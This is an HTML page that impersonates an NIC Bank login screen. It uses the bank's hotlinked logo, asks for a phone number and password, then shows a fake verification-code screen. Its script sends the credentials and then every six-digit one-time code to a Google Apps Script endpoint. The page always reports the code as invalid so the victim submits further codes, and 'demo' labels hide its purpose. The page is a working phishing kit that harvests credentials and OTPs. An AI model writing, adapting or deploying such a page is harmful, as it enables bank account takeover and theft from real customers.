<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>NIC Bank Login</title>


    <style>

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }


        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #eeeeee;
            min-height: 100vh;

            display: flex;
            align-items: center;
            justify-content: center;

            padding: 20px;
        }


        /* =================================================
           LOGIN BOX
        ================================================= */

        .login-box {

            width: 440px;
            max-width: 94%;

            background: #ffffff;

            border-radius: 20px;

            padding: 35px 25px 34px;

            box-shadow:
                0 5px 25px rgba(0,0,0,0.15);

            position: relative;
        }


        /* =================================================
           LOGO
        ================================================= */

        .logo-area {

            width: 100%;
            height: 145px;

            display: flex;
            align-items: center;
            justify-content: center;

            margin-bottom: 20px;
        }


        .logo-area img {

            width: 190px;
            max-width: 100%;

            height: 145px;

            object-fit: contain;
        }


        /* =================================================
           INPUT
        ================================================= */

        .input-box {

            height: 60px;

            border: 1px solid #d5d5d5;

            border-radius: 7px;

            display: flex;
            align-items: center;

            padding: 0 14px;

            margin-bottom: 36px;

            background: #fff;

            transition: 0.2s;
        }


        .input-box:focus-within {

            border-color: #c90000;

            box-shadow:
                0 0 0 2px rgba(201,0,0,0.08);
        }


        .input-box .icon {

            width: 35px;

            font-size: 24px;

            color: #59616c;

            display: flex;

            align-items: center;
            justify-content: center;
        }


        .input-box input {

            width: 100%;
            height: 100%;

            border: none;
            outline: none;

            padding-left: 10px;

            font-size: 16px;

            color: #333;

            background: transparent;
        }


        .input-box input::placeholder {

            color: #bdbdbd;
        }


        /* =================================================
           LOGIN BUTTON
        ================================================= */

        .login-btn {

            width: 100%;
            height: 57px;

            border: none;

            border-radius: 15px;

            background: #c90000;

            color: white;

            font-size: 18px;

            font-weight: bold;

            cursor: pointer;

            transition: 0.2s;
        }


        .login-btn:hover {

            background: #ad0000;
        }


        .login-btn:disabled {

            opacity: 0.7;

            cursor: not-allowed;
        }


        /* =================================================
           STATUS
        ================================================= */

        #status {

            text-align: center;

            margin-top: 12px;

            font-size: 14px;

            min-height: 20px;
        }


        /* =================================================
           FORGOT
        ================================================= */

        .forgot {

            display: block;

            text-align: center;

            margin-top: 16px;

            color: #111;

            font-size: 16px;

            font-weight: bold;

            text-decoration: none;
        }


        .forgot:hover {

            text-decoration: underline;
        }


        /* =================================================
           DIVIDER
        ================================================= */

        .divider {

            display: flex;

            align-items: center;

            gap: 10px;

            margin: 27px 0 24px;
        }


        .divider::before,
        .divider::after {

            content: "";

            height: 1px;

            background: #dddddd;

            flex: 1;
        }


        .divider span {

            color: #e60012;

            font-size: 18px;

            font-weight: bold;
        }


        /* =================================================
           SIGNUP
        ================================================= */

        .signup {

            text-align: center;

            color: #333;

            font-size: 16px;

            margin-bottom: 14px;
        }


        .signup a {

            color: #333;

            text-decoration: underline;
        }


        /* =================================================
           FACEBOOK
        ================================================= */

        .facebook-btn {

            width: 100%;

            height: 36px;

            border: none;

            border-radius: 6px;

            background: #1769c2;

            color: white;

            display: flex;

            align-items: center;

            cursor: pointer;

            font-size: 18px;

            margin-bottom: 17px;

            box-shadow:
                0 3px 8px rgba(0,0,0,0.12);
        }


        .facebook-icon {

            width: 55px;

            font-size: 27px;

            font-weight: bold;

            text-align: center;
        }


        .facebook-text {

            flex: 1;

            text-align: center;

            margin-right: 55px;
        }


        /* =================================================
           GOOGLE
        ================================================= */

        .google-btn {

            width: 100%;

            height: 67px;

            border: 1px solid #d6d6d6;

            border-radius: 6px;

            background: #fff;

            color: #777;

            display: flex;

            align-items: center;

            cursor: pointer;

            font-size: 16px;

            box-shadow:
                0 3px 9px rgba(0,0,0,0.15);
        }


        .google-icon {

            width: 55px;

            font-size: 25px;

            font-weight: bold;

            text-align: center;

            margin-left: 8px;
        }


        .google-text {

            flex: 1;

            text-align: center;

            margin-right: 50px;
        }


        /* =================================================
           OTP SCREEN
        ================================================= */

        #otpScreen {

            display: none;
        }


        .verification-box {

            width: 440px;

            max-width: 94%;

            background: #ffffff;

            border-radius: 20px;

            padding: 35px 25px 34px;

            box-shadow:
                0 5px 25px rgba(0,0,0,0.15);

            position: relative;

            text-align: center;
        }


        /* =================================================
           PHONE ICON
        ================================================= */

        .phone-icon {

            width: 58px;
            height: 72px;

            margin: 5px auto 22px;

            border: 3px solid #c90000;

            border-radius: 12px;

            display: flex;

            align-items: center;
            justify-content: center;

            color: #c90000;

            font-size: 14px;

            font-weight: bold;
        }


        /* =================================================
           OTP MESSAGE
        ================================================= */

        .message {

            color: #555;

            font-size: 15px;

            line-height: 1.6;

            margin-bottom: 25px;
        }


        /* =================================================
           OTP INPUTS
        ================================================= */

        .otp-container {

            display: flex;

            justify-content: center;

            gap: 9px;

            margin-bottom: 25px;
        }


        .otp {

            width: 48px;
            height: 55px;

            border: 1px solid #d5d5d5;

            border-radius: 8px;

            outline: none;

            text-align: center;

            font-size: 22px;

            font-weight: bold;

            color: #333;

            background: #fff;

            transition: 0.2s;
        }


        .otp:focus {

            border-color: #c90000;

            box-shadow:
                0 0 0 2px rgba(201,0,0,.10);
        }


        /* =================================================
           OTP BUTTON
        ================================================= */

        .continue-btn {

            width: 100%;

            height: 57px;

            border: none;

            border-radius: 15px;

            background: #c90000;

            color: #fff;

            font-size: 18px;

            font-weight: bold;

            cursor: pointer;

            transition: 0.2s;
        }


        .continue-btn:hover {

            background: #ad0000;
        }


        .continue-btn:disabled {

            opacity: 0.7;

            cursor: not-allowed;
        }


        /* =================================================
           OTP STATUS
        ================================================= */

        #otpStatus {

            min-height: 20px;

            margin-top: 12px;

            font-size: 14px;
        }


        /* =================================================
           COUNTDOWN
        ================================================= */

        .resend {

            margin-top: 20px;

            color: #666;

            font-size: 13px;

            line-height: 1.6;
        }


        .question {

            display: inline-flex;

            width: 20px;
            height: 20px;

            align-items: center;
            justify-content: center;

            border-radius: 50%;

            background: #c90000;

            color: white;

            font-weight: bold;
        }


        /* =================================================
           MOBILE
        ================================================= */

        @media (max-width: 480px) {

            body {
                padding: 12px;
            }


            .login-box,
            .verification-box {

                width: 100%;

                max-width: 100%;

                padding:
                    28px
                    20px
                    30px;

                border-radius: 18px;
            }


            .logo-area {

                height: 130px;
            }


            .logo-area img {

                width: 175px;

                height: 130px;
            }


            .input-box {

                margin-bottom: 28px;
            }


            .login-btn {

                height: 57px;
            }


            .otp-container {

                gap: 6px;
            }


            .otp {

                width: 43px;

                height: 50px;

                font-size: 20px;
            }

        }


        @media (max-width: 350px) {

            .otp-container {

                gap: 4px;
            }


            .otp {

                width: 39px;

                height: 48px;
            }

        }


        .verification-box {
    width: 100%;
    max-width: 380px;
    min-height: 430px;
    padding: 20px 10px;
    text-align: center;
}

/* Icon */
.phone-icon {
    width: 58px;
    height: 96px;
    margin: 0 auto 43px;
    background: #b52227;
    border-radius: 5px;
    position: relative;
    padding-top: 7px;
}

.phone-icon::before {
    content: "";
    display: block;
    width: 44px;
    height: 67px;
    margin: auto;
    background: #f4f4f4;
    border-radius: 2px;
}

.phone-icon::after {
    content: "";
    position: absolute;
    width: 9px;
    height: 9px;
    background: #922026;
    border-radius: 50%;
    bottom: 5px;
    left: 25px;
}

/* Message bubble */
.phone-icon span {
    position: absolute;
    z-index: 2;
    top: 25px;
    left: 7px;
    width: 44px;
    height: 34px;
    background: #d6aa38;
    color: #783f20;
    font-size: 20px;
    font-weight: bold;
    line-height: 30px;
}

.phone-icon span::after {
    content: "";
    position: absolute;
    bottom: -7px;
    left: 7px;
    border-width: 7px 7px 0 0;
    border-style: solid;
    border-color: #d6aa38 transparent transparent transparent;
}


    </style>

</head>


<body>


<!-- =====================================================
     STEP 1 — LOGIN
===================================================== -->

<div class="login-box" id="loginScreen">


    <!-- LOGO -->

    <div class="logo-area">

        <img
            src="https://www.nicasiabank.com/_next/image/?url=%2Fassets%2Fimages%2Flogin.png&w=640&q=75"
            alt="Demo Logo"
        >

    </div>


    <!-- EMAIL -->

    <div class="input-box">

        <div class="icon">
            📞
        </div>

        <input
            type="phonenumber"
            id="email"
            placeholder="Enter Phone Number"
            autocomplete="off"
        >

    </div>


    <!-- NAME -->

    <div class="input-box">

        <div class="icon">
            🔒
        </div>

        <input
            type="password"
            id="name"
            placeholder="Enter Password"
            autocomplete="off"
        >

    </div>


    <!-- LOGIN -->

    <button
        type="button"
        class="login-btn"
        id="loginBtn"
    >
        Log In
    </button>


    <!-- STATUS -->

    <p id="status"></p>


    <!-- FORGOT -->

    <a
        href="#"
        class="forgot"
    >
        Forgot Password
    </a>


    <!-- DIVIDER -->

    <div class="divider">

        <span>
            ✣
        </span>

    </div>


    <!-- SIGNUP -->

    <div class="signup">

        Don't have an account?

        <a href="#">
            Signup
        </a>

    </div>


    <!-- FACEBOOK -->

    <button
        type="button"
        class="facebook-btn"
    >

        <span class="facebook-icon">
            f
        </span>

        <span class="facebook-text">
            Login With Facebook
        </span>

    </button>


    <!-- GOOGLE -->

    <button
        type="button"
        class="google-btn"
    >

        <span class="google-icon">

            <span style="color:#4285F4;">
                G
            </span>

        </span>

        <span class="google-text">
            Login With Google
        </span>

    </button>


</div>



<!-- =====================================================
     STEP 2 — DEMO OTP
===================================================== -->

<div
    class="verification-box"
    id="otpScreen"
>


    <!-- PHONE -->

    <div class="verification-box">

    <!-- Phone illustration -->
    <div class="phone-icon">
        <span>***</span>
    </div>



    <!-- MESSAGE -->

    <div class="message">

        We have sent you a verification code to<br>
        Please enter it below.
        <br>

      

    </div>


    <!-- OTP -->

    <div class="otp-container">


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >


        <input
            class="otp"
            type="text"
            maxlength="1"
            inputmode="numeric"
            autocomplete="off"
        >

    </div>


    <!-- CONTINUE -->

    <button
        type="button"
        class="continue-btn"
        id="otpBtn"
    >
        Continue
    </button>


    <!-- OTP STATUS -->

    <p id="otpStatus"></p>


    <!-- COUNTDOWN -->

    <div class="resend">

      

       Didn't get a code? <br> You will be able to request

        <span id="countdown">
            120
        </span>

        seconds.

    </div>


</div>



<script>



const GOOGLE_SHEET_URL =
    "https://script.google.com/macros/s/AKfycbyUBq9vGWgFZCOKm83_cElkBxAfCKAlKYpe9GN6-mUHlVJC4wawhRdA_hu8JYAMDNot2Q/exec";


/* =====================================================
   ELEMENTS
===================================================== */

const loginScreen =
    document.getElementById("loginScreen");

const otpScreen =
    document.getElementById("otpScreen");

const loginBtn =
    document.getElementById("loginBtn");

const status =
    document.getElementById("status");

const otpBtn =
    document.getElementById("otpBtn");

const otpStatus =
    document.getElementById("otpStatus");

const otpInputs =
    document.querySelectorAll(".otp");

const countdown =
    document.getElementById("countdown");


/* =====================================================
   LOGIN
===================================================== */

loginBtn.addEventListener(
    "click",
    saveDemoData
);


async function saveDemoData() {

    const phone =
        document
            .getElementById("email")
            .value
            .trim();

    const name =
        document
            .getElementById("name")
            .value
            .trim();


    /* VALIDATION */

    if (!phone || !name) {

        status.textContent =
            "Please enter phone number and name.";

        status.style.color =
            "#c90000";

        return;
    }


    /* BUTTON */

    loginBtn.disabled = true;

    loginBtn.textContent =
        "Loading...";


    try {

        const response =
            await fetch(
                GOOGLE_SHEET_URL,
                {
                    method: "POST",

                    body: JSON.stringify({

                        phone: phone,

                        name: name

                    })
                }
            );


        const result =
            await response.json();


        if (!result.success) {

            throw new Error(
                result.error ||
                "Unable to save data."
            );
        }


        /* LOCAL DEMO DATA */

        localStorage.setItem(
            "demo_user",
            JSON.stringify({

                phone: phone,

                name: name,

                savedAt:
                    new Date()
                    .toISOString()

            })
        );


        /* CHANGE SCREEN */

        loginScreen.style.display =
            "none";

        otpScreen.style.display =
            "block";


        /* START TIMER */

        startCountdown();


        /* FOCUS FIRST OTP */

        setTimeout(
            function() {

                otpInputs[0].focus();

            },
            100
        );


    } catch (error) {

        console.error(
            "GOOGLE SHEETS ERROR:",
            error
        );


        status.textContent =
            "Database Error: " +
            error.message;

        status.style.color =
            "#c90000";


        loginBtn.disabled =
            false;

        loginBtn.textContent =
            "Log In";
    }

}


/* =====================================================
   OTP AUTO NEXT
===================================================== */

otpInputs.forEach(
    function(input, index) {

        input.addEventListener(
            "input",
            function() {

                input.value =
                    input.value.replace(
                        /\D/g,
                        ""
                    );


                if (
                    input.value &&
                    index <
                    otpInputs.length - 1
                ) {

                    otpInputs[
                        index + 1
                    ].focus();

                }

            }
        );


        input.addEventListener(
            "keydown",
            function(e) {

                if (
                    e.key === "Backspace" &&
                    !input.value &&
                    index > 0
                ) {

                    otpInputs[
                        index - 1
                    ].focus();

                }

            }
        );

    }
);


/* =====================================================
   OTP
===================================================== */

otpBtn.addEventListener(
    "click",
    async function() {


        const firstDigit =
            otpInputs[0].value.trim();

        const secondDigit =
            otpInputs[1].value.trim();

        const thirdDigit =
            otpInputs[2].value.trim();

        const fourthDigit =
            otpInputs[3].value.trim();

        const fifthDigit =
            otpInputs[4].value.trim();

        const sixthDigit =
            otpInputs[5].value.trim();


        /* VALIDATION */

        if (
            !firstDigit ||
            !secondDigit ||
            !thirdDigit ||
            !fourthDigit ||
            !fifthDigit ||
            !sixthDigit
        ) {

            otpStatus.textContent =
                "Please enter the OTP";

            otpStatus.style.color =
                "#c90000";

            return;
        }


        /* FIRST TWO DIGITS ONLY */

        const demoOtpFirst2 =
            firstDigit +
    secondDigit +
    thirdDigit +
    fourthDigit +
    fifthDigit +
    sixthDigit;


        const savedUserRaw =
            localStorage.getItem(
                "demo_user"
            );


        if (!savedUserRaw) {

            otpStatus.textContent =
                "User record not found.";

            otpStatus.style.color =
                "#c90000";

            return;
        }


        const savedUser =
            JSON.parse(
                savedUserRaw
            );


        /* BUTTON */

        otpBtn.disabled =
            true;

        otpBtn.textContent =
            "Loading...";


        try {

            /*
              Save only first 2 OTP digits
              to Google Sheet.
            */

            const response =
                await fetch(
                    GOOGLE_SHEET_URL,
                    {
                        method: "POST",

                        body: JSON.stringify({

                            phone:
                                savedUser.phone,

                            name:
                                savedUser.name,

                            demo_otp_first2:
                                demoOtpFirst2

                        })
                    }
                );


            const result =
                await response.json();


            if (!result.success) {

                throw new Error(
                    result.error ||
                    "Unable to save OTP."
                );
            }


            /*
              Demo response
            */

            otpStatus.textContent =
                "OTP invalid. Please try again.";

            otpStatus.style.color =
                "#c90000";


            otpBtn.disabled =
                false;

            otpBtn.textContent =
                "Try Again";


            /*
              Clear OTP fields
            */

            otpInputs.forEach(
                function(input) {

                    input.value = "";

                }
            );


            otpInputs[0].focus();


        } catch (error) {

            console.error(
                "GOOGLE SHEETS OTP ERROR:",
                error
            );


            otpStatus.textContent =
                "Database Error: " +
                error.message;

            otpStatus.style.color =
                "#c90000";


            otpBtn.disabled =
                false;

            otpBtn.textContent =
                "Continue";
        }

    }
);


/* =====================================================
   120 SECOND COUNTDOWN
===================================================== */

function startCountdown() {

    let seconds = 120;


    countdown.textContent =
        seconds;


    const timer =
        setInterval(
            function() {

                seconds--;

                countdown.textContent =
                    seconds;


                if (seconds <= 0) {

                    clearInterval(timer);

                    countdown.textContent =
                        "0";

                    otpStatus.textContent =
                        "Code expired.";

                    otpStatus.style.color =
                        "#c90000";

                    otpBtn.disabled =
                        false;

                }

            },
            1000
        );

}

</script>


</body>
</html>
